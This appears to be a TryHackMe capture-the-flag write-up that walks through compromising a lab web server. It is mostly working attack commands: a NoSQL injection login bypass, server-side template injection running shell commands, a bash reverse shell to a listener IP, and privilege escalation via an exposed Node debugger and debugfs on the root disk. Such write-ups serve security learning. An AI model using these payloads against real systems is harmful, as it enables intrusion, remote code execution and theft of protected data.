---
title: "Do Not Disturb"
date: 2026-10-31 20:49:22 +0700
categories: ["TryHackMe", "Holiday Challenge"]
tags: ["tryhackme"]
toc: true
comments: false
---

![image-1419](/assets/img/obsidian/do-not-disturb/image-1419.png)

![image-1420](/assets/img/obsidian/do-not-disturb/image-1420.png)

# Scenario

![image-1424](/assets/img/obsidian/do-not-disturb/image-1424.png)

# Questions

![image-1422](/assets/img/obsidian/do-not-disturb/image-1422.png)

---

# Recon

Scan for port opening using `rustscan`

Port 22 (SSH) and 80 (HTTP) are opening.

![image-1425](/assets/img/obsidian/do-not-disturb/image-1425.png)

![image-1426](/assets/img/obsidian/do-not-disturb/image-1426.png)

So, let's check website first.

![image-1427](/assets/img/obsidian/do-not-disturb/image-1427.png)

![image-1428](/assets/img/obsidian/do-not-disturb/image-1428.png)

`curl -i -s -c cookie.txt -d 'username=attendant&password[$ne]=x' http://10.48.173.139/login`

If the server is vuln and direcly uses the parsed input in MongoDB query

this turn 

```js
{ username: "attendant", password: "x" }
```

into 

```js
{ username: "attendant", password: { $ne: "x" } }
```

meaning **"find the `attendant` user whose password is not `x`."**

If such a query is accepted without proper validation, it can potentially result in **authentication bypass**.

![image-1429](/assets/img/obsidian/do-not-disturb/image-1429.png)

We got cookie at /staff location

![image-1430](/assets/img/obsidian/do-not-disturb/image-1430.png)

Now, we gonna perform template injection

```bash
 curl -s -b cookie.txt --data-urlencode 'template=<%=7*7%>' http://10.48.173.139/staff/preview
```

![image-1431](/assets/img/obsidian/do-not-disturb/image-1431.png)

and we can see that they accept our injected template. So, now let's inject feather template to do reverse shell

```bash
curl -s -b cookie.txt --data-urlencode 'template=<%=global.process.mainModule.require("child_process").execSync("id").toString() %>' http://10.48.173.139/staff/preview
```


![image-1432](/assets/img/obsidian/do-not-disturb/image-1432.png)

```bash
curl -s -b cookie.txt --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.141.248/4444 0>&1\"').toString() %>" http://10.48.173.139/staff/preview 
```

Reverse shell

![image-1433](/assets/img/obsidian/do-not-disturb/image-1433.png)

![image-1434](/assets/img/obsidian/do-not-disturb/image-1434.png)

![image-1435](/assets/img/obsidian/do-not-disturb/image-1435.png)

Fount first flag at `/home/poolside/user.txt`

![image-1436](/assets/img/obsidian/do-not-disturb/image-1436.png)

and we found **processor.js** file

![image-1437](/assets/img/obsidian/do-not-disturb/image-1437.png)

and this running as loop, so this mean it keep running at the background

![image-1438](/assets/img/obsidian/do-not-disturb/image-1438.png)

We found that it use port 9229 with --inspect flag and connect using node

So, we will use this following commands 

```bash
node inspect 127.0.0.1:9229
repl
# validate
process.getuid()
process.getgid()
process.cwd()
process.getBuiltinModule('child_process').execSync('id').toString()
process.getBuiltinModule('child_process').execSync("ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true").toString()
```

![image-1439](/assets/img/obsidian/do-not-disturb/image-1439.png)

It show we are in group disk.

![image-1440](/assets/img/obsidian/do-not-disturb/image-1440.png)


```bash
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'ls /root', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

![image-1441](/assets/img/obsidian/do-not-disturb/image-1441.png)

find `root.txt`

```bash
process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
```

![image-1442](/assets/img/obsidian/do-not-disturb/image-1442.png)

Finally, get the flag!

---
